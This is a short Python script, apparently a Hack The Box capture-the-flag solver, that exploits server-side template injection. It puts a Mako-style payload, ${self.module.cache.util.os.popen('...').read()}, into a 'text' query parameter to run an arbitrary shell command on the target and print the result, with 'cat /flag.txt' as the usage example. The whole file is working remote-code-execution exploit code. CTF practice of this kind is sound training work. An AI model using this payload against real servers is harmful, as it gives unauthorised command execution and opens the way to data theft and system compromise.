import requests
import sys
import re

def send_request(host_port, command):
    """
    Send a request to a specified host:port with a command.
    """
    if ':' not in host_port:
        host_port = f"{host_port}:1337"
    
    host, port = host_port.rsplit(':', 1)
    
    # Build URL with endpoint always as /
    url = f"http://{host}:{port}/"
    command = f"${{self.module.cache.util.os.popen('{command}').read()}}"
    
    # Send request
    try:
        params = {'text': command}
        
        response = requests.get(url, params=params)
        
        # Extract flag pattern HTB{*stuff*}
        match = re.search(r'HTB\{[^}]+\}', response.text)
        if match:
            flag = match.group(0)
            print(flag)
        else:
            print(response.text)
        
        return response
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Error sending request: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: python solver.py <host:port> <command>")
        print(f"Example: python solver.py localhost:1337 'cat /flag.txt'")
        sys.exit(1)
    
    host_port = sys.argv[1]
    command = sys.argv[2]
    
    send_request(host_port, command)

